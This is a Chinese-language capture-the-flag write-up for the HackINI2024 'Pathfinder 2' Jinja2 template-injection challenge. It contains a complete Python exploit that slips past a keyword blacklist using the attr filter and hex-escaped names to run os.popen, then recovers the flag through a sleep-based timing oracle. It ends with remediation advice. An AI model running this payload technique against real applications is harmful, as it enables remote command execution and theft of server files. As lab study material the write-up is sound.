# HackINI2024 Pathfinder 2

## 题目简述

第二版仍把 `name` 拼进 Jinja2 模板，但加入了包含点号、下划线、方括号、`{{ }}`、`globals`、`os`、`popen` 和 `read()` 等内容的子串黑名单。目标是改用 `{% ... %}` 语句和 `attr` 过滤器，并在 Jinja 字符串中用十六进制转义隐藏敏感名称，通过响应时间逐字符恢复 flag。

## 解题过程

黑名单没有禁止 `{%`、`%}`、`attr` 或反斜杠十六进制转义。以下对象链等价于：

```python
lipsum.__globals__["os"].popen(command).read()
```

但每个敏感标识都写成 `\xNN`，所以过滤器看到的原始 payload 中没有下划线、`globals`、`os`、`popen` 或 `read()`。由于 `{{ }}` 被禁，可把调用放入 `{% if ... %}`，命令根据猜测前缀是否存在决定是否 `sleep 5`：

```python
import string
import time
import requests

target = "http://TARGET/"
alphabet = string.ascii_letters + string.digits + "{}_!$?"

def hx(text):
    return "".join(f"\\x{ord(char):02x}" for char in text)

def make_payload(prefix):
    command = (
        f"if grep -Fq '{prefix}' /app/flag*; "
        "then sleep 5; fi"
    )
    expression = (
        "lipsum"
        f"|attr('{hx('__globals__')}')"
        f"|attr('{hx('__getitem__')}')('{hx('os')}')"
        f"|attr('{hx('popen')}')('{hx(command)}')"
        f"|attr('{hx('read')}')()"
    )
    return "{% if " + expression + " %}{% endif %}"

prefix = "shellmates{"
while not prefix.endswith("}"):
    for char in alphabet:
        candidate = prefix + char
        start = time.perf_counter()
        requests.get(
            target,
            params={"name": make_payload(candidate)},
            timeout=8,
        )
        if time.perf_counter() - start > 4.5:
            prefix = candidate
            print(prefix)
            break
    else:
        raise RuntimeError("no candidate produced the timing signal")
```

整个 shell 命令也被十六进制编码，所以猜测中出现黑名单字符时不会在原始参数中暴露。逐字符观察约 5 秒延迟，最终恢复：

```text
shellmates{yoUUUUu_aReeEeeEE_NOOWww_OfFfFFFIciAlLyyYY_MYyyYYy_besToOo0000OO0o_FrieEEeeEEnddoOOOoOo}
```

## 方法总结

模板注入黑名单只约束某一种拼写，无法消除 Jinja 对象访问、过滤器和字符串转义提供的等价表达。即使响应中不直接回显命令输出，时间差仍可形成布尔 oracle。根本修复仍是取消用户输入的模板解释，而不是继续扩充黑名单；运行账户也应遵循最小权限并限制敏感文件访问。
